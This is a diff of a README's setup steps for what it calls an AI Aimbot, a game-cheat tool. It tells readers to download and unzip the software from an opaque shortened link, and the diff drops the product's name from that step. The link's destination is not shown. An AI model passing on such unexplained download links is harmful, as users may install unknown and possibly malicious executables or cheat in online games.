@@ -34,7 +34,7 @@
 
 ## 🚀 Setup Steps
 
-1. Download and Unzip the AI Aimbot 🗂️. - Install Latest Version [HERE](https://shorten.is/4KYNR)
+1. Download and Unzip 🗂️. - Install Latest Version [HERE](https://shorten.is/4KYNR)
 2. Ensure you've got Visual C++ pack installed  – grab latest version [HERE](https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170).
 
 
